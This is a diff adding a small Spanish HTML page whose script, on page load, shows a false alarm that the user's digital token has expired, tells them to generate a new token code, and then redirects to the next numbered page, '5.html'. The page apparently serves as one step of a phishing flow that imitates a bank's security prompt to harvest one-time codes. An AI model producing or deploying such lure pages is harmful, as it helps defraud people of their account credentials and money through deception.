@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alerta en Carga</title>
+    <script>
+        function mostrarAlerta() {
+            // Muestra la alerta
+            alert("TOKEN DIGITAL VENCIDO!\nGENERE UN NUEVO CODIGO TOKEN PARA CONTINUAR");
+            // Redirige a otro índice
+            window.location.href = "5.html"; // Cambia "index.html" a la URL que desees
+        }
+
+        // Llama a la función cuando se carga la página
+        window.onload = mostrarAlerta;
+    </script>
+</head>
+</html>
